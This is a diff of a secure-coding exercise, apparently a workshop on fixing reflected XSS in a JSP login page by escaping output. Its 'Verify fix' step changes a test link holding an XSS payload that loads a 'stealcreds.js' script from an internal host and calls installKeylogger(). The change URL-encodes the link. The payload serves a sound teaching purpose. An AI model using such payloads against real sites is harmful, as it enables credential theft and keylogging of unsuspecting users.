@@ -100,7 +100,7 @@ To fix this you need to wrap the `${error}` and `${info}` expressions into a spe
     </c:if>
 ```
 ### Verify fix
-Please stop and start the application again and open the links:
-* http://localhost:8080/login?info=Welcome back!<script src='http://sprg-tools.el.eee.intern/js/stealcreds.js'></script><script>installKeylogger()</script> 
+Please stop and start the application again and open the malicious link with the XSS payload again :  
+http://localhost:8080/login?info=Welcome%20back!%3Cscript%20src=%27http://sprg-tools.el.eee.intern/js/stealcreds.js%27%3E%3C/script%3E%3Cscript%3EinstallKeylogger()%3C/script%3E
 Now no popup should be displayed. And you should see html code in the browser
 ![](images_exercises/Script_Tag_Escaped.png)
